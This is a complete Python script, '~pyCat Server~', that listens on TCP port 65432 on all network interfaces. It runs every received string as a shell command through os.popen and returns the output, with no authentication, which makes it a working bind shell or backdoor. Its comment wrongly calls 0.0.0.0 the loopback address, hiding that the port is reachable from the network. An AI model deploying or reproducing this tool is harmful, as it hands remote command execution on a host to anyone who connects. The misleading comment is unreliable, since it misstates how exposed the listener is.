#!/usr/bin/env python3


import socket
import os

HOST = '0.0.0.0'      # Standard loopback interface address (localhost)
PORT = 65432            # Port to listen on (non-privileged ports are > 1023)

def serv():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print('~pyCat Server~ is RUNNING ')
        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(65536).decode()
                if data == 'quit 2>&1':
                    exit()
                out1 = os.popen(data).read().encode()
                conn.sendall(out1)
serv()
